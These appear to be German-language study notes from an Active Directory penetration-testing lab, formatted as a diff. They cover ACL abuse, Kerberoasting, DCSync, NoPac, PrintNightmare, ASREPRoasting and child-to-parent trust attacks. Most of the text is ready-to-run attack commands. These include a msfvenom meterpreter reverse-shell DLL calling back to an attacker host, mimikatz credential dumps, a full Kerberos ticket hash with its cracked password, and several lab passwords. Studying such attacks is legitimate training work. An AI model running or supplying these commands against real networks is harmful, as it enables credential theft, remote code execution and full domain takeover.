+	- Mit Find-InterestingDomainAcl in PowerShell bekommen wir viele ACLs
+	- Mit PowerView koennen wir viele ACLs filtern und uns nur fuer bestimmte User ACLs anzeigen lassen
+		- Import-Module .\PowerView.ps1
+		- $sid = Convert-NameToSid <User>
+	- Mit der Funktion Get-DomainObjectACL koennen wir alle Domain Objekte fuer den User anzeigen lassen
+		- Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+	- Wir koennen den Wert von GUID googlen, das GUID werden unter ObjectAceType gespeichert
+	- Sonst koennen wir auch den GUID Wert suchen und das Zugriffsrecht anzeigen lassen
+		- $guid= "<GUID>"
+		- Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
+
+	- In PowerView gibt es ein Flag namens -ResolveGUIDs mit dem die GUID sofort aufgeloest werden
+		- Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+- Creating List of Domain User:
+	- Erzeugt eine Datei mit allen Domain Usern
+		- Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
+	- Mit dieser User Liste koennen wir eine ACL Liste anzeigen lassen:
+		- foreach($line in [System.IO.File]::ReadLines("<User_File>")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match '<Domain>\\<User>'}}
+
+- Investigating Domain Group(Help Desk):
+	- Der Usernamen von der Gruppe raussuchen und den Namen in SID umwandeln
+			- Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
+			- $itgroupsid = Convert-NameToSid "<Help_Desk_User>"
+			- Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
+		- Looking for Interesting Access:
+			- $adunnsid = Convert-NameToSid <Username>
+			- Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
+	- Wir koennen uns die ACLs auch in BloodHound grafisch anzeigen lassen 
+
+$sid = Convert-NameToSid forend
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} - Verbose
+
+3. ACL Abuse Tactics:
+	- Wir muessen in der PowerShell Konsole als der User authentifizieren oder wir sind schon als dieser eingeloggt
+	- Um dies zu tun muessen wir ein PSCredential Objekt erstellen
+	- Creating a SecureString Object:
+		- $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+	- Creating a PSCredential Object:
+		- $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+	- Changing the User's Password:
+		- Import-Module .\PowerView.ps1
+		- Set-DomainUserPassword -Identity <User> -AccountPassword $<SecureString_Object> -Credential $Cred -Verbose
+	- Adding User to the Help Desk Level 1 Group:
+		- Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
+		- Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members '<User>' -Credential $<PSCredential_Objekt> -Verbose
+	- Confirming User was Added to the Group:
+		- Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+	- Creating a Fake SPN:
+		- Set-DomainObject -Credential $<PSCredential_Objekt> -Identity <User_to_take_Over> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+	- Kerberoasting with Rubeus:
+		- .\Rubeus.exe kerberoast /user:<User_to_take_Over> /nowrap
+
+- Cleanup:
+	- Removing the Fake SPN from adunn's Account:
+		- Set-DomainObject -Credential $<PSCredential_Objekt> -Identity <User_to_take_Over> -Clear serviceprincipalname -Verbose
+	- Removing User from the Help Desk Level 1 Group:
+		- Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members '<User_to_take_Over>' -Credential $<PSCredential_Objekt> -Verbose
+	- Confirming damundsen was Removed from the Group:
+		- Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq '<User>'} -Verbose
+
+$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
+$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+
+$krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$E3D1CDBE246DC65F7D2F1F8ECD889465$F5490DF5BFF3D2D0565A03471363691AC94A693830C512D33165F1D2FA670A899F80B5C98B49E21E7C9E6246CBB024D6D780E068C382A275B71AA09E880FFCC6AEFCABF8A1CBD0C3A7A3219B0A8E4E2023251CE630A601386F898D94AF2733C22B8E516FD2B0351D7779CEA6B869863FE22680647E7F53AC6EA5D63395927C21528A357947ECB2B190E6C5BF0BDCA474C49C0132C7FCD93E7C1741887A97532FA0E8457A4CCFD5C2E05DC2938C6660D051BBD7CCA0ADD77A8AC4440C5A5C4DB1E1CCCB377749D658A5F5B8DB6E81BEE7AE588F036A99FF8CF9F7CFA7FDA8461E03341C3FD102ADBEC54F4D3AD4D566F79EC99059F789BAD4EBA73F25AF35DED1FC65AD77C9D080167FB35EEB9C0911323E25FCBE3FBC7F4CC048A739A0A05595E0B68DC54B186957462ADA07490D86D9E55DC1D7F92C5ECC7C5567740998426F7B06CB02297C10F47590277166D0EDB17F0E67F29AEBA696816EBE8A31C9A13A6BDFDB0C784A4540AAD92C2B7AD8DD864AA827A509E33D7C7F7483676A90568E70A58EA27B3FBAE37B00AFF876094A7ACABB5B15934C1F473929D52762A5FE3283DD3D6405214EB87F856876B4E788315B8A07CFC542A838614132D32215FE44E160E22E152530112346FEEE00B04A94765B7E956DF76EE2EB0B069725CB98434F2AF38D7C02614510566083737C6C6FC876CABA338D57A3A06B1929890763E32127AD7EF5A05605E89188B7D8AD38700BBB8096D628699DC1E1182EFC8134AFA102D9B366AC295892289081917EF6241600D195B49B9544D1991031555409ABE42D7E1C6F368BD7C8167DDB8F5A8B04B6A4A12A22FF9C1056C59BBACA4F478588C0EC841DB35FB3A68E1B4B80C68A264291D8074092FD308967640CBA9350E1C6AA8E50218218B5FAAEF6CA4723877E17B44119D8978D58C1F52217652DFC8453F97F1AA1B61141D198311833BDBD05EAC8DFB9249BC7B58D92DB10B065992E945E02963A84B4FE54236BAEC37ACDB530A460E00B451782018E6D55D8669808DC30AE239513655443EFF2AC7EE46F07067B9724CBE7FF4B75272414CCEB4A79B4A01E7F3E8F90E15687AB72421BDFDB73F90F3F6EFE8CBF2F7CEAC56B8CC6DDB92A26268749CB6AA28C7CC0A0987655F922606EC35C3E5C2D1125D3B6923DFA744C52FC58F66362F524CA9D86ECE3478FFD14A33EBC2E898B008364C274B8A5CAE4BBF1E91ADE3A8BA91A0EE2F9098666A306065215C12CC4BA3228F73C524968AC7631947CFE346A1BE9D07F11B7D7BA0478F4CE0ECAB0138B27AC4037D4485BCCDD0F637B4F978C7BB66CB90909A2163DA703F3035A51B26F6D13A832DFE5C5880DEDE9CA325D165DD0146C282F98CFA5332BBD828E8619B0FE3C96561B3E93075E860F80BAD92F2744F96640326B4A4D5CA4C67B36A0F55F2EBA6FE8591D5EC83FA3E8427811C583D0B859EEA8C457F49E5757E3BA36B4103F27C7F3C17B21004F0558A5532865BD3889F366151D3FE5A400C8BE0DD988E3783699849963661C24F8A5DAB94121169571BD60EF563CAF75F6068F12E0D40088E7BF88DBC3D47CD25474214E9FE53B6D26EB3C0808E1ADCA563C6347B292EDDDE25C50F36F856D7B92214075B5EACC1622F3D1F02203E2B87042128182CA
+
+sudo john hash.txt --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt
+SyncMaster757
+
+4. DCSync:
+- DCSync ist eine Technik um die Active Directory Password Database zu stehlen indem das Directory Replication Service Remote Protocol verwendet wird
+- Wir geben uns als ein Domain Controller aus und erhalten Daten von anderen Domain Controllern
+- Wir replizieren die Passwoerter mit dem DS-Replication-Get-Changes-All Recht
+- Hierfuer benoetigen wir eine User mit den Rechten fuer Domain Replication(Replicating Directory Changes und Replicating Directory Changes All permissions set)
+- Domain Admins und Default Domain Admins haben diese Rechte als Standard
+- Using Get-DomainUser to View adunn's Group Membership:
+	- Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+- Using Get-ObjectAcl to Check adunn's Replication Rights:
+	- $sid= "<adunn_sid>"
+	- Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+
+- Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py:
+	- secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
+
+- Enumerating Further using Get-ADUser:
+	- Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+- Checking for Reversible Encryption Option using Get-DomainUser:
+	- Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+- Performing the Attack with Mimikatz:
+	- .\mimikatz.exe
+	- lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+
+Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
+Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+
+.\mimikatz.exe user adunn
+mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\syncron
+
+###################################################################################################
+Stacking The Deck
+1. Privileged Access:
+- Um uns lateral durch das Netzwerk zu bewegen benoetigen wir einen Host mit mehr Rechten
+- Wir koennen mit einem lokalen Admin Account einen Pass-the-Hash Angriff durchfuehren um uns mit dem SMB Protokoll auszufuehren
+- Wenn wir keine Admin Rechte auf einem Host haben gibt es andere Moeglichkeiten:
+	- (RDP)Remote Desktop Protocol: Gibt uns eine GUI Zugang zu einem Host
+	- (WinRM)PowerShell Remoting(https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.2): Erlaubt uns das Ausfuehren von Befehlen auf einem Remote PC
+	- MSSQL Server: Eine Account mit sysadmin Rechten auf einem SQL Server kann auf anderen SQL Servern mit den gleichen Rechten auch Befehle ausfuehren
+	- Wir koennen diese Zugaenge mittels BloodHound mit folgenden Modulen enumerieren:
+		- CanRDP(https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
+		- CanPSRemote(https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
+		- SQLAdmin(https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)
+
+- Remote Desktop:
+	- Wenn wir eine Zugriff auf lokalen Admin Account haben zu einer Maschine koennen wir uns mit RDP in einen remote Host einloggen
+	- Mit PowerView koennen wir Get-NetLocalGroupMember Funktion um mit dem Enumerierung zu beginnen
+	- Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+
+- WinRM:
+	- Wenn wir auf einen User/Gruppe Zugang haben die zu WinRM Zugang haben
+	- Der User kann auch einer mit wenigen Rechten sein mit dem wir nach sensiblen Daten suchen koennen oder um Rechte zu eskalieren
+	- Mit der Gruppe Remote Management Users bekommen wir standardmaessig Zugang zu WinRM
+	- Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
+	- Establishing WinRM Session from Windows:
+		- $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+		- $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+		- Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
+		- Session beenden: Exit-PSSession
+	- Wir koennen ebenso vom Linux Host mit evil-winrm(https://github.com/Hackplayers/evil-winrm) mit WinRM verbinden
+		- evil-winrm -i 10.129.201.234 -u forend
+	- In Blooudhound koennen wir ebenso nach Zugaenge fuer WinRM suchen:
+		- MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+
+- SQL Server Admin:
+	- Wir finden oft Account mit sysadmin Rechten fuer eine SQL Server Instanz
+	- Wir koennen an Credentials fuer diesen Account mittels Kerbroasting, LLMNR/NBT-NS oder Password Spraying gelangen
+	- Ein anderes Tool ist Snaffler(https://github.com/SnaffCon/Snaffler) mit dem wir web.config order andere Arten von Konfigurationsdateien finden koennen
+	- Mit BloodHound koennen benso Zugaenge gefunden werden:
+		- MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
+	- Enumerating MSSQL Instances with PowerUpSQL:
+		- Import-Module .\PowerUpSQL.ps1
+		- PowerUpSQL Cheat Sheet (https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
+		- Get-SQLInstanceDomain
+	- Mit remote SQL Server verbinden und Befehle schicken:
+		- Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+		- Auf Linux koennten wir mssqlclient.py(https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) verwenden
+			- mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+
+		- In Mssql eingeloggt koennen wir xp_cmdshell erlauben:
+			- Mit xp_cmdshell koennen wir Betriebssystem Befehle ausfuehren
+			- enable_xp_cmdshell
+			- Befehle mit xp_cmdshell ausfuehren
+				- xp_cmdshell <command> 
+			- Mit xp_cmdshell whoami /priv koennen wir unsere Rechte im System ausgeben
+
+	Questions:
+	1. Get-DomainGroupMember -Identity "Remote Management Users"
+	bdavis
+
+	2. Get-Domain
+	ACADEMY-EA-DC01
+
+	3. mssqlclient.exe auf windows ausfuehren
+
+
+2. Kerberos "Double Hop" Problem:
+- Kerberos Authentifikation kann ueber mehrere Hops verwendet werden
+- Kerberos Tickets erlauben Zugriff auf Ressourcen, wenn wir ein Passwort verwenden wird dieses als NTLM Hash in der Sitzung gespeichert
+- Bei der Verwendung von Kerberos Authentifizierung kann es Auftreten, das eine Ressource auf eine andere Ressource zugreift, hierbei muss das Kerberos-Ticket vom User zum anderen Server weitergegeben werden muss
+
+- Hierfuer gibt es ein paar Workarrounds:
+	- Workarrounds Post(https://posts.slayerlabs.com/double-hop/)
+	- Workarround1 PSCredential Object:
+		- Wir verbinden uns mit dem Host A und erstellen ein PSCredential Objekt mit unseren Credentials
+		- import-module .\PowerView.ps1
+		- $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
+		- $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
+
+	- Workarround2 Register PSSession Configuration:
+		- Wir verbinden uns mit Host A via WinRM und verbinden und mit einem anderen Host via WinRM
+		- Wir koennen mit dem Enter-PSSession Cmdlet uns mit einem anderen Ziel verbinden
+		- Verbinden mit dem ersten Host:
+			- Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
+		- PSSession Erstellen und verbinden mit zweitem Host:
+			- Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
+			- Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
+
+3. Bleeding Edge Vulnerabilities:
+- Meistens benoetigen Firmen eine gewisse Zeit um ihre Systeme upzudaten
+- NoPac (SamAccountName Spoofing):
+	- Ein gutes Beispiel ist die Sam_The_Admin(https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699) Schwachstelle auch SamAccountName Spoofing genannt
+	- Hiermit koennen sich Users mehr Privilegien in einer Domaine bekommen
+	- Wir koennen den SamAccountNamen von einem Computer in einen Domain Controller aendern
+	- Wir bekommen dann ein Ticket von Kerberos TGS mit dem wir SYSTEM Privilegien bekommen koennen
+	- Fuer diesen Angriff wurde ein Tool angelegt noPAC(https://github.com/Ridter/noPac)
+	- NoPac verwendet Impacket um zu kommunizieren und sendet eine Shell zurueck
+	- Scanning for NoPac:
+		- sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
+	- Running NoPac & Getting a Shell:
+		- sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+	- Das Kerberos Ticket wird im Verzeichnis gespeichert dieses wird auf dem Attack Host gespeichert
+	- Using noPac to DCSync the Built-in Administrator Account:
+		- sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
+
+- PrintNightmare:
+	- PrintNightmare ist ein Nickname fuer Print Spooler Service(https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) der auf allen Windows Systemen laeuft
+	- Diese Schwachstelle erlaubt Privilege Escalation und Remote Code Execution
+	- Wir koennen eine Shell mit System Rechten erlangen auf einem Domain Controller der auf Windows Server 2019 laeuft
+	- Wir werden einen Explpoit von cube0x0 verwenden (https://github.com/cube0x0/CVE-2021-1675.git)
+	- cube0x0 Version of Impacket:
+		- pip3 uninstall impacket
+		- git clone https://github.com/cube0x0/impacket
+		- cd impacket
+		- python3 ./setup.py install
+	- Mit rpcdump.py koennen wir die Print Systeme enumerieren:
+		- rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
+	- Wir muessen eine DLL Payload erstellen:
+		- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll
+	- Share mit smbserver.py erstellen:
+		- sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
+	- Running the Exploit:
+		- sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'
+
+4. Miscellaneous Misconfigurations:
+- Exchange Related Group Membership:
+	- Eine Standard Installation von Microsoft Exchange in einer AD Umgebung oeffnet viele Angriffsvektoren
+	- Die Gruppe Exchange Windows Permissions ist keine geschuetzte Gruppe aber die Mitglieder haben das Recht eine DACL in die Domaina zu schreiben
+	- Hier koennen wir dem User viele Rechte geben unter anderem DCSync 
+	- Ein Angreifer kann einen User hinzufuegen oder eine User in der Gruppe Account Operator uebernehmen
+	- Die Exchange Gruppe Organization Management ist ebenso eine maechtige Gruppe, die Mitglieder dieser Gruppe koennen auf jede Mailboxes zugreifen
+	- Die Gruppe Organization Management hat ausserdem vollen Zugriff auf die OU Microsoft Exchange Security Groups die die Gruppe Exchange Windows Permissions enthaelt
+
+- PrivExchange:
+	- PrivExchange nutzt einen Fehler im Exchange Server PushSubscription feature aus
+	- Ein User muss einen Mailbox Zugang haben, dieser User kann durch Exchange sich an einem anderen Host ueber HTTP authentifizieren
+	- Der Exchange Service laeuft standardmaessig auf dem Host mit System Rechten 
+
+- Printer Bug:
+	- Der Printer Bug ist ein Fehler im MS-RPRN Protokoll
+	- MS-RPRN ist fuer die Verwaltung von Druckauftraegen verantwortlich
+	- Um die Schwachstelle auszunutzen muessen wir mit der named Pipe RpcOpenPrinter kommunizieren und dort die RpcRemoteFindFirstPrinterChangeNotificationEx Methode ausfuehren damit der Server Clienten ueber SMB authentifizieren kann
+	- Wir koennen das Modul Get-SpoolStatus vom Tool Security-Assessment(https://github.com/cube0x0/Security-Assessment) verwenden um Schwachstellen wir MS-RPRN Printer Bug zu finden
+		- Import-Module .\SecurityAssessment.ps1
+		- Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+
+- MS14-068:
+	- MS14-068 ist eine Schwachstelle im Kerberos Protokoll um von einem normalen Userkonto mehr Rechte zu erlangen
+	- Kerberos Ticket erhalten Informationen ueber User, Accountnamen, Gruppenmitgliedschaft, Privilege Attribute Certificate(PAC)
+	- PAC wird von der Key Distribution Center(KDC) signiert damit dieser nicht manipuliert werden kann
+	- Die Schwachstelle erlaubt einen eigenen PAC zu erstellen diesen wird der KDC auch akzeptieren
+	- Diese Schwachstelle kann mit dem Tool  Python Kerberos Exploitation Kit (PyKEK)(https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek)
+
+- Sniffing LDAP Credentials:
+	- Viele Anwendungen oder Drucker speichern LDAP Credentials in der Web Admin Console um sich mit der Domaine verbinden zu koennen 
+	- Manchmal koennen wir diese Credentials als Klartext lesen
+	- Manche Anwendungen haben eine test connection Funktion hier muessen wir die LDAP Adresse aendern in unsere Attack Host IP
+	- Auf dem Attack Host muessen wir einen netcat Listener auf dem LDAP Port 389 Port oeffnen
+	- Der Angriff wird hier durchgefuehrt(https://grimhacker.com/2018/03/09/just-a-printer/)
+
+- Enumerating DNS Record:
+	- Wenn wir einen gueltigen Accounts in unserer Domaine haben koennen wir mit adidnsdump(https://github.com/dirkjanm/adidnsdump) die DNS Eintraege enumerieren
+	- Der Angriff wird hier beschrieben(https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
+		- adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
+		- DNS Eintraege ausgeben: cat records.csv
+	- Using the -r Option to Resolve Unknown Records:
+		- adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
+
+- Password in Description Field:
+	- Manchmal befinden sich Passwoerter in dem Beschreibungsfeld
+	- Passwoerter finden mit PowerView
+	- Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
+
+- PASSWD_NOTREQD Field:
+	- Es ist moeglich in der Domaine Account zu finden mit dem Feld passwd_notreqd aktiviert
+	- Wenn dieses nicht gesetzt ist muss der User sich nicht an die Password Richtlinie halten
+	- Manchmal kann dieses Passwort leer sein um die Installation einfacher zu halten usw
+	- Checking for PASSWD_NOTREQD Setting using Get-DomainUser:
+		- Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+
+- Credentials in SMB Shares and SYSVOL Scripts:
+	- Der SYSVOL Share kann viele Daten enthalten gerade in grossen Firmen
+	- Hier koennen wir Scripts und Daten finden
+
+- Group Policy Preferences (GPP) Passwords:
+	- Wenn eine GPP erstelle ist wird eine XML Datei in der SYSVOL Share erstellt
+	- Diese Dateien koennen:
+		- Lokale User erstellen
+		- Erstellt Config Files fuer Drucker
+		- Erstellt updatet Services
+	- Diese Dateien koennen Arrays enthalten in denen Usernamen und Passwoerter stehen
+
+- ASREPRoasting:
+	- Es ist moeglich ein Ticket Granting Ticket(TGT fuer einen Account bei dem Kerberos pre-authentication aktiviert ist
+	- Bei pre-authentication gibt der User das Password ein, der Password verschluesselt ein Zeitstempel
+	- Der Domain Controller wird die Anfrage entschluesseln um die Richtigkeit des Passwort zu beschliessen
+	- Wenn das deaktiviert ist kann ein Angreifer TGT vom Domain Controller holen und entschluesseln
+	- Dieser Angriff kann mit Rubeus durchgefuehrt werden
+	- Ein Angreifer benoetigt GenericWrite und GenericAll Rechte fuer diesen Angriff
+	- Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUse:
+		- Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+	- Retrieving AS-REP in Proper Format using Rubeus:
+		- .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+	- Hash cracking with Hashcat:
+		- hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
+	- Retrieving the AS-REP Using Kerbrute:
+		- kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+	- Hunting for Users with Kerberoast Pre-auth Not Required:
+		- GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
+
+- Group Policy Object (GPO) Abuse:
+	- Group Policys werden von Admins dafuer verwendet um Richtlinien fuer eine Gruppe zu erstellen
+	- Wenn wir Rechte ueber eine Group Policy mit einer ACL Miskonfiguration koennen wird dies ausnutzen um uns durch das System zu bewegen und uns mehr Rechte zu bekommen
+	- GPO zu enumerieren ist ein wichtiger Bestandteil
+	- Wir koennen viele Tools verwenden um GPO zu enumerieren:
+		- BloodHound
+		- PowerView
+		- group3r
+		- ADRecon
+		- PingCastle
+	- Enumerating GPO Names with PowerView:
+		- Get-DomainGPO |select displayname
+	- Wenn Group-Policy Verwaltungstools installiert sind koennen wir GroupPolicy cmdlets verwenden. Get-GPO ist ein Cmdlet von GroupPolicy cmdlets:
+		- Get-GPO -All | Select DisplayName
+	- Enumerating Domain User GPO Rights:
+		- $sid=Convert-NameToSid "Domain Users"
+		- Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
+	- Converting GPO GUID to Name:
+		- Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
+
+###################################################################################################
+Why So Trusting?
+1. Domain Trusts Primer:
+- Hier eine Liste von bekannten SIDs (https://adsecurity.org/?p=1001)
+- Wenn Firmen andere Firmen aufkaufen muessen die beiden Firmen auf einen Nenner gebracht werden
+- Es muss ein Trust erstellt werden zwischen den beiden Domainen
+- Firmen muessen ebenso eine Trust mit Managed Service Providers(MSP), Kunden und anderen Dienstleistern herstellen
+
+- Domain Trusts Overview:
+	- Ein Trust(https://social.technet.microsoft.com/wiki/contents/articles/50969.active-directory-forest-trust-attention-points.aspx) ist eine Authentifikation von Forest zu Forest oder Domain zu Domain welches dem User erlaubt auf andere Ressourcen zuzugreifen
+	- Ein Trust erstellt eine Verbindung zwischen zwei Domainen kann eine einweg oder bidrektional Verbindung sein
+
+- Enumerating Trust Relationships:
+	- Mit dem Cmdlet Get-ADTrust koennen wir die Domain Trust Beziehungen enumerieren
+		- Import-Module activedirectory
+		- Get-ADTrust -Filter *
+	- Wir koennen ebenso PowerView verwenden mit der Funktion Get-DomainTrust
+		- Get-DomainTrust
+	- Wir koennen ebenso alle Trust in einem Netzwerk mit PowerView enumerieren:
+		- Get-DomainTrustMapping
+	- Checking Users in the Child Domain using Get-DomainUser:
+		- Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
+	- Ein weiteres Tool ist netdom in CMD hier koennen wir ebenso Informationen ueber Domainen und Trust bekommen:
+		- Show Domain Trust:
+			- netdom query /domain:inlanefreight.local trust
+		- Show Domain Controller:
+			- netdom query /domain:inlanefreight.local dc
+		- Show Workstations and Servers:
+			- netdom query /domain:inlanefreight.local workstation
+
+2. Attacking Domain Trusts - Child -> Parent Thrusts - from Windows:
+- SID History Primer:
+	- Wenn User in eine andere Domaine umziehen wird das Attribut sidHistory gleich der originaen User SID gesetzt, sodass der User noch auf die Ressourcen der alten Domaine zugreifen kann
+	- Mit Mimikatz kann ein Admin Account dem sidHistory Attribut hinzugefuegt werden kann
+	- Wenn sich der User einloggt werden alls SIDs in dem sidHistory Attribut dem User Token hinzugefuegt
+	- Dieser Token gibt auf welche Ressourcen der User Zugriff hat
+	- Wenn ein Domain Admin Account der SID History hinzugefuegt wird kann ein DCSync Angriff durchgefuehrt werden um ein Golden Ticket oder ein Kerberos Ticket-granting-ticket zu bekommen um uns als jeder Account in der Domaine zu authentifizieren
+
+- ExtraSids Attack - Mimikatz:
+	- Dieser Angriff erlaubt eine parent Domaine zu uebernehmen wenn eine Kind Domaine uebernommen worden ist
+	- In einem AD Forest gibt es kein SID Filtering deswegen wird sidHistory respektiert
+	- SID Filtering ist ein Schutz um Authentifizierungsanfragen von einer Domaine auf den Forest herauszufiltern
+	- Wenn ein User in einer Child Domaine eine SID in der sidHistory hat der in der Gruppe Enterprise Admin Gruppe ist hat er admin Zugriff auf den gesamten Forest
+	- Wir erstellen ein Golden Ticket fuer die Child Domaine um die Parent Domaine zu uebernehmen
+	- Hierfuer benoetigen wir einige Ding:
+		- KRBTGT Hash fuer die Child Domain:
+			- mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
+		- SID fuer die Child Domain:
+			- Get-DomainSID
+		- Name des Targetuser in der Child Domain:
+			- Muss nicht wirklich da sein
+		- FQDN von der Child Domain:
+			- mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
+		- SID von der Enterprise Admin Gruppe von der Root Domaine:
